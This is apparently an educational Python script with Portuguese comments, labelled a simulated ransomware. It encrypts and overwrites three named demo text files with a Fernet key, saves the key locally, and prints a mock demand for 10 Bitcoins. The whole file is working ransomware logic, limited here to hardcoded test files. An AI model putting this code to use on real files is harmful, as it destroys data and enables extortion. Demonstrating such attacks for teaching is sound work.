from cryptography.fernet import Fernet
import os

# 1. Gerando a chave de criptografia (em um ataque real, o hacker guardaria isso)
chave = Fernet.generate_key()
f = Fernet(chave)

# Salvando a chave em um arquivo para podermos descriptografar depois
with open("chave_resgate.key", "wb") as key_file:
    key_file.write(chave)

# 2. Definindo nossos arquivos de teste ALVO (Totalmente seguro, só afeta esses)
arquivos_alvo = ["planilha_casamento.txt", "treino_ppl.txt", "roteiro_berlim.txt"]

# 3. Processo de sequestro (Criptografia)
print("Iniciando o Ransomware Simulado...")
for arquivo in arquivos_alvo:
    if os.path.exists(arquivo):
        # Lê o conteúdo original
        with open(arquivo, "rb") as file:
            dados_originais = file.read()
        
        # Criptografa
        dados_criptografados = f.encrypt(dados_originais)
        
        # Sobrescreve o arquivo com os dados embaralhados
        with open(arquivo, "wb") as file:
            file.write(dados_criptografados)
        
        print(f"🔒 {arquivo} foi sequestrado!")

print("\nArquivos criptografados! Deixe 10 Bitcoins na minha carteira para receber a chave.")
